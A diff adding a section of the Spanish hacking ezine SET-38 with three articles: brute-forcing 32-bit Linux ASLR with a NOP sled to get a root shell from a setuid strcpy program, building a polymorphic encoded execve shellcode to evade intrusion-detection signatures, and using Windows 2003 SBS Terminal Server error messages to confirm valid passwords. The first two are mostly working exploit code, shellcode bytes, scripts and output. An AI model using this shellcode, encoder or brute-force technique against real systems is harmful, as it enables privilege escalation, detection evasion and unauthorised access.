@@ -1,0 +1,679 @@
+-[ 0x03 ]--------------------------------------------------------------------
+-[ Bazar de SET ]------------------------------------------------------------
+-[ by Varios Autores ]-----------------------------------------------SET-38--
+
+
+
+                              -== INDICE ==-
+
+3x01  ASLR No Tan Aleatorio                     Hacking      blackngel
+
+3x02  Shellcodes Polimorficos en Linux          Hacking      blackngel
+
+3x03 Respuestas reveladoras en Win 2003
+     SBS Terminal Server                        Info/Hack    d00han.t3am
+
+
+
+-[ 3x01 ]--------------------------------------------------------------------
+-[ ASLR No Tan Aleatorio ]---------------------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         <blackngel1@gmail.com>
+          ||         <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+Lo que vamos a demostrar aqui no es nada nuevo, en realidad la informacion
+surge de unos videos publicados en la web por un tal BlackLight, pero mis
+intenciones son varias: por un lado demostrar la experiencia propia, por otro
+ofrecer todas las aclaraciones posibles y como no, despues de todos los
+articulos publicados con respecto a la explotacion en linux en la anterior
+edicion de SET, esto constituye un buen agregado a todo lo ya mostrado.
+
+En definitiva, plasmaremos en formato ASCII el problema que representa la
+confianza de los usuarios en el actual sistema ASLR (Address Space Layout
+Randomization) que se encarga de la supuesta aleatorizacion de direcciones
+de memoria.
+
+ASLR no previene la sobreescritura de datos en memoria, esto es, que todavia
+tenemos la capacidad de sobreescribir valores de retorno guardados por
+llamadas a funciones, y por lo tanto redirigir el flujo de un programa a
+una direccion de nuestra eleccion.
+
+De lo que realmente se encarga ASLR, es de que no podamos predecir la direccion
+de ningun buffer dado, ni cualquier otra direccion que se encuentre sobre el
+stack (como por ejemplo la zona ocupada por las variables de entorno). Esto se
+logra mediante la ya mencionada aleatorizacion de las direcciones de la pila
+y el heap.
+
+Ahora, analizandolo realmente la efectividad de esta pseudo-aleatorizacion y
+tomando de la mano el pequeño programa que siempre usamos para obtener la
+direccion de una variable de entorno, obtenemos los siguientes datos.
+
+     HOME is located at 0xbffe3e1a
+     HOME is located at 0xbf9a5e1a
+     HOME is located at 0xbfa68e1a
+     HOME is located at 0xbfe35e1a
+     HOME is located at 0xbfb9ce1a
+     HOME is located at 0xbfec0e1a
+     HOME is located at 0xbf9eae1a
+     HOME is located at 0xbfa9ce1a
+     HOME is located at 0xbfb6be1a
+     HOME is located at 0xbf880e1a
+ 
+De los 4 bytes que componen la direccion, vemos que son los 3 ultimos los
+que varian en cada ejecucion. De ello podemos deducir que de los 32 bits
+que esta ocupa, 24 son los que sufren el cambio:
+
+	3 bytes * 8 bits/byte = 24 bits
+
+Pero si cojemos una muestra de las direccion obtenidas, y comparamos sus
+valores en binario, podemos sacar otra apreciacion:
+
+                   1er byte  2do byte   3er byte  4to byte
+                   --------  ---------  --------  --------
+     0xbffe3e1a -> 10111111  1 1111110  00111110  00011010
+     0xbfa68e1a -> 10111111  1 0100110  10001110  00011010
+     0xbf880e1a -> 10111111  1 0001000  00001110  00011010
+
+Vemos que el bit mas significativo (MSB) del segundo byte es comun en
+todas las direcciones, y de ahi deducimos que el numero de bits realmente
+aleatorizados es 23.
+
+Ahora, que cantidad de espacio de memoria se puede direccionar con dichos
+bits:
+
+     /------ 23 bits ------\
+     11111111111111111111111 = 8388607 bytes
+
+     8388607 / 1024   = 8192 kbytes
+     8192    / 1024   = 8 mb
+
+Exactamente 8 megabytes (aunque lo hayamos aclarado for dummies).
+
+En mi caso, la maxima cantidad de bytes que he logrado introducir en el
+entorno ronda a la siguiente:
+
+     $ export PAD=`perl -e 'print "A"x131000'`
+
+Depende de que variables tengas ya establecidas en tu entorno particular,
+pero siempre rondara los 128 kb.
+
+La cuestion es, con respecto a los 8 mb de espacio aleatorizado, que
+porcentaje representan 131 kilobytes en nuestro caso de estudio?
+
+     8388607     ->     100 %   |    X = (131000 * 100) / 8388607
+      131000     ->      X %    |    X = 1,561641879 %
+
+Osease, alrededor de un 1,6 % de los 8 mb que ya hablamos. Entonces este
+mismo porcentaje es el de posibilidades que tenemos de que en una de las
+ejecuciones del programa el contenido de nuestra variable de entorno caiga
+en esas direcciones.
+
+Lo obvio. Si nosotros intentamos caer en la direccion exacta de comienzo
+de un shellcode situado en el entorno, lo tendremos muy pero que muy crudo.
+Pero... si introducimos cerca de 128000 instrucciones NOP antes de nuestra
+shellcode, tendremos ese 1,6 % de posibilidades de ejecutar codigo arbitrario.
+
+Luego solo es cuestion de ejecutar el exploit una cierta cantidad de veces
+hasta que tengamos la suerte de entrar dentro de ese porcentaje que nos dara
+el premio; y creeme, no son tantas.
+
+Cogeremos este programa vulnerable:
+
+---[ meet.c ]---
+ 
+   greeting(char *temp1, char *temp2) {
+      char name[512];
+      strcpy(name, temp2);
+      printf("Hello, %s %s\n", temp1, name);
+   }
+
+   main(int argc, char *argv[]) {
+      greeting(argv[1],argv[2]);
+      printf("Bye %s %s\n", argv[1], argv[2]);
+   }
+
+---[ end meet.c ]---
+
+En primer lugar introduzcamos nuestro shellcode:
+
+     $ export PAD=`perl -e 'print "\x90"x130000'``cat sc`
+
+Vease que "sc" es un archivo binario conteniendo los bytes del shellcode
+escogido.
+
+Comprobemos ahora el relleno necesario para sobreescribir la direccion de
+retorno guardada:
+
+(gdb) run black `perl -e 'print "A"x526'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/blackngel/.../bo/meet black `perl -e 'print "A"x526'`
+Hello, black AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+Cannot access memory at address 0x8004141
+0x08004141 in ?? ()
+
+Bien, debemos rellenar 524 bytes y luego nuestra direccion de retorno deseada.
+Cual utilizar? Como ya explique, cualquiera que caiga dentro del espacio de
+memoria de los 8 megas aleatorizados, luego solo es cuestion de suerte que
+esa direccion coincida con alguna perteneciente al gran relleno de NOPS que
+hemos introducido en el entorno. Si esto ocurre, el flujo de codigo se
+desplazara como una cinta de transporte hasta alcanzar nuestro shellcode, y
+entonces el control estara en nuestras manos.
+
+Para demostrar que es cuestion de suerte, escogere la tercera direccion que
+obtuvimos al principio del articulo: "0xbfa68e1a". Luego hago uso de ella en
+el siguiente y sencillo script:
+
+---[ ex.sh ]---
+
+   #!/bin/sh
+
+   for i in `seq 1 500`;
+   do
+      echo "\nIntento: $i"
+      ./meet black `perl -e 'print "A"x524 . "\x1a\x8e\xa6\xbf"'`
+   done
+
+---[ end ex.sh ]---
+
+Le damos permisos de ejecucion:
+
+     $ sudo chmod u+x ex.sh
+
+Y cambiamos el usuario del programa a root y lo setuidamos:
+
+     $ sudo chown root:root meet
+     $ sudo chmod u+s meet
+     $ ls -al meet
+     -rwsr-xr-x 1 root root 6540 2009-08-14 20:00 meet
+
+Lo ejecutamos y...
+
+blackngel@mac:~/Exploiting/bo$ ./ex.sh | more
+\nIntento: 1
+./ex.sh: line 3: 13153 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 2
+./ex.sh: line 3: 13155 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 3
+./ex.sh: line 3: 13157 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 4
+./ex.sh: line 3: 13159 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 5
+./ex.sh: line 3: 13161 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 6
+./ex.sh: line 3: 13163 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 7
+./ex.sh: line 3: 13165 Fallo de segmentación  ./meet black `perl -e 'print
+                                                 "A"x524 . "\x1a\x8e\xa6\xbf"'`
+\nIntento: 8
+sh-3.2#
+
+Jajaja, a eso si que le llamo yo suerte, al octavo intento nada mas y nada
+menos, es mas, la primera vez que probe el comando a manos sin el escript,
+a la cuarta tenia una shell con permisos de root delante de mis ojos. Otras
+veces necesitaras 68 intentos, otras 200 y pico, y otras mas, pero que mas
+da, lo importante es que lo hemos logrado y tenemos el control del sistema.
+
+Recuerda que este ataque solo es viable en local, ya que cualquier fallo de
+segmentacion provocado en un servicio remoto causaria su caida, y normalmente
+(salvo que posea alguna clase de mecanismo de reinicio automatico) esto
+implica que no dispondremos de mas intentos para ejecutar codigo arbitrario.
+
+
+CONCLUSION
+----------
+
+Este es el metodo que mejor demuestra la mayor debilidad del sistema de
+seguridad ASLR implementado en la mayor parte de las distribuciones linux
+de hoy en dia. No obstante, otros metodos todavia siguen siendo viables.
+Entre ellos el clasico "return to esp o ret2esp".
+
+Todos sabemos que el registro ESP apunta normalmente al inicio de las
+variables declaradas dentro de una funcion, ya que este marca la cima
+del stack. Por decirlo de alguna manera, es uno de los pocos testigos
+que sabe en tiempo de ejecucion donde se encuentra nuestro buffer (su
+direccion), algo que nosotros no somos capaces de predecir antes de que
+esto ocurra. Por lo tanto, si sobreescribimos la direccion de retorno
+guardada con otra direccion que apunte a una instruccion como "jmp *%esp"
+o "call *$esp", esta deberia ir directamente a caer dentro de nuestra
+shellcode (normalmente precedida de un relleno de NOPS), logrando asi
+el objetivo principal.
+
+Una instruccion como "jmp *%esp" no es mas que un par de bytes: "ff e4".
+De modo que tampoco es necesario que el programa vulnerable contenga una
+direccion como esta, sino que al menos se encuentre por casualidad esta
+combinacion de bytes dentro de una zona marcada con permisos de ejecucion.
+
+BlackLight tambien apunto en uno de sus videos la forma de lograr nuevamente
+la ejecucion de codigo arbitrario haciendo uso de la tecnica "ret2reg", que
+viene a decir que si algun registro del procesador (eax, ebx, ecx, etc...)
+apuntara por casualidad a nuestro buffer, podriamos utilizar nuevamente una
+instruccion como "jmp reg" o "call reg". Pero debe advertirse que esto solo
+se da en ciertos programas. Su exploit tiene truco (aunque a proposito), ya
+que en el se utiliza un puntero al que se le asigna la direccion del buffer
+vulnerable, y de este modo, cuando se produce el fallo de segmentacion, el
+registro %eax queda apuntando al mismo, y por lo tanto la tecnica es
+factible.
+
+Sin mas, espero que esto haya sido de utilidad y te anime a pensar que
+cuando hay gente que nos pisa los frenos, nosotros no soltamos el acelerador.
+
+P.D.: Te atreves a probar esta tecnica en un sistema de 64 bits? Quizas lo
+      veamos en esta misma revista en un futuro.
+
+Feliz Hacking!
+blackngel
+
+
+*EOF*
+
+-[ 3x02 ]--------------------------------------------------------------------
+-[ Shellcodes Polimorficos en Linux ]----------------------------------------
+-[ by blackngel ]------------------------------------------------------------
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         <blackngel1@gmail.com>
+          ||         <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+Vimos en la anterior edicion de SET como construir nuestras propias Shellcode
+bajo entornos Linux con una arquitectura de 32 bits. Hoy en dia, cualquier
+sistema de deteccion de intrusos (IDS o sus variantes HIDS, NIDS, etc...),
+es capaz de detectar la mayor parte de los ataques contra buffer overflows
+debido al hecho de que es muy simple reconocer el patron tipico de un shellcode
+clasico.
+
+Los virus han sufrido este problema durante mucho tiempo, partes de su cuerpo
+eran comparadas contra bases de datos con firmas pre-grabas y de este modo
+eran frenados de inmediato.
+
+Para evadir este problema, ciertos programadores de virus empezaron a utilizar
+una tecnica que ya poseian algunos seres biologicos. Estoy hablando del
+"polimorfismo". Tenemos segun la wikipedia que:
+
+     "En computacion (informatica), es también una técnica utilizada
+      por virus informáticos y gusanos para modificar partes de su
+      codigo dificultando su deteccion".
+
+La pregunta obvia es entonces: Se puede aplicar esta tecnica en la codificacion
+de un Shellcode? La respuesta, ya esperada, es SI, sino este breve articulo
+no tendria ningun sentido. Al fin y al cabo un Shellcode no es un objeto
+completamente inanimado, sino simplemente un binario conteniendo codigo
+ejecutable.
+
+Un codigo polimorfico consta de 3 partes, 2 de ellas van siempre unidas dentro
+del Shellcode, la otra es externa, las tres son:
+
+     -> El cifrador
+     -> El descifrador
+     -> El Shellcode original
+
+El objetivo es cifrar un shellcode normal con una llave aleatoria de modo que
+el resultado final no pueda ser reconocida por ninguna base de datos con
+patrones pre-establecidos.
+
+Lo que queda claro aqui es que este mismo codigo debe descifrarse con la misma
+llave justo antes de ejecutarse, sino no podriamos predecir el comportamiento
+que tendria, y seguramente acabaria en un desastre. El descifrador ira "pegado"
+al shellcode original, y sera la unica parte del codigo que no ira cifrada.
+Graficamente quedaria asi:
+ 
+                         ___________________
+                        [    DESCIFRADOR    ]
+                        [___________________]
+                        [                   ]
+                        [                   ]
+                        [ SHELLCODE CIFRADO ]
+                        [                   ]
+                        [___________________]
+
+Vale, ya ha quedado claro que el cifrador se trata de un elemento externo,
+es por eso que de momento nos vamos a centrar en los otros dos.
+
+Tomemos uno de los shellcodes utilizados en el articulo ya mencionado:
+
+ 8048060:       31 c0                	xor    %eax,%eax
+ 8048062:       50                   	push   %eax
+ 8048063:       68 2f 2f 73 68       	push   $0x68732f2f
+ 8048068:       68 2f 62 69 6e       	push   $0x6e69622f
+ 804806d:       89 e3                	mov    %esp,%ebx
+ 804806f:       50                   	push   %eax
+ 8048070:       53                   	push   %ebx
+ 8048071:       89 e1                	mov    %esp,%ecx
+ 8048073:       b0 0b                	mov    $0xb,%al
+ 8048075:       cd 80                	int    $0x80
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+                   "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+Bien, sabemos que no esta cifrado, pero vamos a imaginar que lo estuviera,
+y que el algoritmo fuera tan basico como un Cifrado del Cesar, es decir,
+que a todos los bytes del mismo se le ha sumado cierta cantidad, por ejemplo
+un "3". Entonces... sabrias escribir un breve codigo ensamblador que fuera
+capaz de revertir este proceso?
+
+Vamos a ello. Os acordais de la estructura que utilizamos en nuestros shellcode
+para acceder a la direccion de una cadena como "/bin/sh"? Se mostraba asi:
+
+    o---jmp offset_to_call
+    |   popl %esi <----------o
+    |   [codigo shell]       |
+    |   ..............       |
+    |   ..............       |
+    |   [codigo shell]       |
+    o-> call offset-to-popl -o
+        .string \"/bin/sh\"
+
+Es decir saltamos a una instruccion call, y esta regresa a la siguiente
+instruccion despues del jump, lo cual parece un sin-sentido, pero la magia
+esta en que la instruccion call pushea en la pila la siguiente instruccion
+a ejecutar despues de ella, que es exactamente la direccion de la cadena
+"/bin/sh" y luego la instruccion "pop" simplemente la recoge en el registro
+ESI, de modo que a partir de ese instante podemos manejar la cadena a nuestro
+antojo.
+
+Ahora miralo asi. Que ocurriria si en lugar de la cadena "/bin/sh" copiamos
+a partir de ahi las instrucciones de nuestro shellcode? Pues que tendriamos
+en ESI la direccion en la que comienza ese codigo, y podriamos realizar sobre
+el todas las operaciones necesarias.
+
+Veamos como pintaria un descifrador general para nuestro proposito:
+
+---[ sc-pol.asm ]---
+
+     global _start
+_start:
+     jmp short magic
+init:
+     pop esi
+     xor ecx,ecx
+     mov cl,0
+desc:
+     sub byte[esi + ecx - 1],0
+     sub cl,1
+     jnz desc
+     jmp short sc
+magic:
+     call init
+sc:
+  ; aqui va el shellcode
+
+---[ end sc-pol.asm ]---
+
+Lo explicamos, primera utilizamos el truco para obtener en ESI la direccion
+donde comenzarian las instrucciones de nuestro shellcode supuestamente cifrado.
+Luego limpiamos ECX y movemos a CL un valor 0, pero esto es temporalmente,
+ya que ese valor debemos cambiarlo posteriormente con la longitud del shellcode
+original (lo veremos). Despues comienza el proceso de descifrado que se trata
+de una simple operacion SUB, que como podeis comprobar, va restando un valor
+0 a cada byte del shellcode original recorriendoles desde el final hasta el
+principio, osease hasta que cl (la longitud) llegue a cero, por eso vamos
+decrementando este registro en cada pasada. Nuevamente, temporalmente restamos
+un valor 0 a cada byte pero este valor tambien se cambiara posteriormente por
+la llave con que hayamos cifrado el shellcode, que en nuestro ejemplo seria un
+3.
+
+Cuando el proceso haya terminado, querra decir que el shellcode ha tomado su
+forma original, y que por lo tanto ya podemos saltar a el para que se ejecute.
+
+Compilemos este codigo y veamos que bytes obtenemos:
+
+blackngel@mac:~$ nasm -f elf sc-pol.asm
+blackngel@mac:~$ ld sc-pol.o -o sc-pol
+blackngel@mac:~$ objdump -d sc-pol
+
+sc-pol:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	eb 11                	jmp    8048073 <magic>
+
+08048062 <init>:
+ 8048062:	5e                   	pop    %esi
+ 8048063:	31 c9                	xor    %ecx,%ecx
+ 8048065:	b1 00                	mov    $0x0,%cl
+
+08048067 <desc>:
+ 8048067:	80 6c 0e ff 00       	subb   $0x0,-0x1(%esi,%ecx,1)
+ 804806c:	80 e9 01             	sub    $0x1,%cl
+ 804806f:	75 f6                	jne    8048067 <desc>
+ 8048071:	eb 05                	jmp    8048078 <sc>
+
+08048073 <magic>:
+ 8048073:	e8 ea ff ff ff       	call   8048062 <init>
+
+
+Recogiendo los valores tenemos:
+
+         Lo cambiaremos por la longitud del shellcode cifrado
+                                ^
+                                |                     ___
+                                |                    |   |
+     "\xeb\x11\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00"  |
+     "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"  |
+                                                         |
+                                                         v
+                     Lo cambiaremos por el valor con que ciframos el shellcode
+
+Hasta aqui todo perfecto, ahora podriamos utilizar un programa que abriera
+un shellcode, leyera los bytes uno a uno y volcara en otro archivo de salida
+el resultado de sumarle el valor 3 a cada uno de ellos. Esto es demasiado
+sencillo, asi que para nuestro proposito, ya que no deseo extenderme mucho,
+lo haremos a mano para la prueba de concepto. De modo que nos queda:
+
+	Original:
+               "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+               "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+	Cifrado:
+               "\x34\xc3\x53\x6b\x32\x32\x76\x6b\x6b\x32\x65\x6c"
+               "\x71\x8c\xe6\x53\x56\x8c\xe4\xb3\x0e\xd0\x83"
+
+Bien, ya lo tenemos, ademas sabemos que la longitud de este shellcode es de
+23 bytes, igual que el original, y que este valor en hexadecimal se traduce
+como: 0x17.
+
+Con esto en mente, ya podemos modificar los dos valores 0 del descifrador
+general que teniamos. El primoero lo sustituiremos por 0x17 (la longitud
+del shellcode cifrado), y el segundo por 0x03 (el valor de la llave con que
+lo ciframos).
+
+Si lo juntamos todo en un programa de prueba nos quedaria como esto:
+
+---[ prueba_sc.c ]---
+
+char shellcode[] = /* Descifrador */
+                   "\xeb\x11\x5e\x31\xc9\xb1\x17\x80\x6c\x0e\xff\x03"
+                   "\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
+                   /* Shellcode Cifrado */
+                   "\x34\xc3\x53\x6b\x32\x32\x76\x6b\x6b\x32\x65\x6c"
+                   "\x71\x8c\xe6\x53\x56\x8c\xe4\xb3\x0e\xd0\x83";
+
+void main() {
+   void (*fp) (void);
+
+   fp = (void *)&shellcode;
+
+   fp();
+}
+
+---[ end prueba_sc.c ]---
+
+Lo probamos y...
+
+blackngel@mac:~$ ./prueba_sc
+sh-3.2$ whoami
+blackngel
+sh-3.2$ exit
+exit
+
+Ahora te invito a hacer una prueba, cambiar el segundo byte del descifrador
+de 0x11 a 0x16, esto provoca que salte directamente al shellcode sin antes
+haberlo descifrado, comprobaras como en este caso se produce un fallo de
+segmentacion, y ello se debe a que interpreta los bytes del mismo como un
+codigo ensamblador muy absurdo como:
+
+     xor    al,0xc3
+     push   ebx
+     imul   esi,DWORD PTR [edx],0x32
+     jbe    0x80495eb
+     imul   esi,DWORD PTR [edx],0x65
+     ins    BYTE PTR es:[edi],dx
+     ...
+
+y llegara un momento en el que se rompe!
+
+A partir de aqui, es tu imaginacion la que puede desarrollar mucho mas esta
+tecnica. Puedes utilizar muchos y muy variados algoritmos de cifrado, entre
+ellos el inverso del que hemos utilizado (primero restar y luego sumar),
+realizar una operacion XOR a cada byte con un valor especificado como llave,
+e incluso cambiar los bytes del shellcode de posicion, por ejemplo el primero
+con el segundo, el tercero con el cuarto o, por que no, el primero con el
+ultimo, el segundo con el penultimo, y asi hasta el final.
+
+Con todo lo que hemos dicho, piensa que no es nada complicado hacer un
+programa al que se le pase como argumento el nombre de un archivo
+conteniendo un shellcode original, y te ofrezca como salida el mismo ya
+cifrado junto con el descifrador agregado al principio y con los valores
+ajustados apropiadamente.
+
+Este trabajo ya ha sido realizado, y es por ello que no me detendre en 
+reinventar la rueda, asi que os dejo una estupenda referencia de un articulo
+que en su momento se publico en la revista Hakin9 y que ahora esta disponible
+en formato PDF.
+
+     [1] http://www.tebo21.com/Contenidos/Hakin9/Hakin9-Crear-el-shellcode-
+         polimorfico.pdf
+
+Feliz Hacking!
+blackngel
+
+
+*EOF*
+
+
+-[ 3x03 ]--------------------------------------------------------------------
+-[ Respuestas reveladoras en Win 2003 SBS Terminal Server ]------------------
+-[ by d00han.t3am ]----------------------------------------------------------
+
+
+
+Objetivo 
+========
+
+Conocer si la password de un usuario es valida simplemente interpretando los 
+mensajes de respuesta de error de Terminal Server en Windows 2003 SBS  
+
+
+
+Introduccion
+============
+
+
+Windows 2003 Small Business Server es una version reducida del ofical
+Windows 2003 Server. Se entiende reducida en cuanto a servicios que presta
+y a precios finales de venta.
+
+Como siempre, para mas informacion:
+
+     http://es.wikipedia.org/wiki/Windows_Small_Business_Server
+
+
+Por defecto, se permiten 2 administradores.
+En esta version de Windows Server, como en otras, se permite el acceso
+remoto por terminal a dos administradores. Si se instala el el Servidor
+de Terminales (Terminal Server) y sus respectivas licencias  podemos
+extender el escritorio remoto a otros usuarios del servidor. 
+
+Para que estos usuarios remotos tengan acceso a este servicio hay varias
+formas de conceder el derecho: 
+
+1) Incluir al usuario en el grupo "Usuarios de escritorio remoto". 
+2) Incluir al usuario en un grupo que explicitamente tenga derechos. 
+3) Individualmente se adjudique a un usuario el derecho. 
+
+
+
+Ataque
+======
+
+
+Cuando intentamos desde Windows (usando Conexion a Escritorio Remoto)
+o desde Linux (rdesktop) conectar con un cliente a un servicio de
+Terminal Server, introducimos un usuario y password que deben ser
+validas en el dominio o en las cuentas locales del servidor. 
+
+Si lo anterior no ocurre, se nos muestra un mensaje de error.  
+
+MSG 1:
+"No se puede iniciar su sesion. Asegurese de que su nombre de usuario
+y dominio sean correctos, luego repita su contrase~a. Las letras de la
+contrase~a se deben escribir usando mayusculas y minusculas correctamente."
+
+Este mensaje no nos indica si el usuario existe o no, o si existe y hemos
+escrito mal la contrase~a.  Hasta aqui bien. 
+
+�Que pasa si el usuario es correcto y la contrase~a es correcta?  
+Bingo!.... entramos.... o no. 
+Depende si el usuario tiene permisos para "logearse" en servidor por
+Terminal Server como se indicaba en la introduccion. 
+
+Supongamos que NO tiene derechos para entrar por Terminal Server. 
+AQUi ES DONDE windows revela, que el usuario existe, que la contrase~a es
+valida y que este usuario no tiene permisos para entrar por Terminal Server: 
+
+MSG 2:
+"Para iniciar una sesion en este equipo remoto, se le debe conceder el derecho
+Permitir inicio de sesion a traves de Terminal Server. De forma predeterminada,
+los miembros del grupo Usuarios de escritorio remoto tienen este derecho. Si no
+es miembro del grupo Usuarios de escritorio remoto o de otro grupo con este
+derecho o si el grupo Usuarios de escritorio remoto no tiene este derecho, se
+le debe conceder derecho manualmente"
+
+
+
+Conclusion 
+==========
+
+ 
+Este tipo de dis-configuracion en Windows SBS 2003 no sirve para automatizar
+un ataque por fuerza bruta  ni mucho menos, pero si nos puede ayudarnos en la
+comprobacion de un determinado usuario-pass que obtenemos  por otros medios o
+para hacer "adivinaciones" manuales de passwords faciles. 
+
+En fin, sacad vuestras propias conclusiones.
+
+
+*EOF*
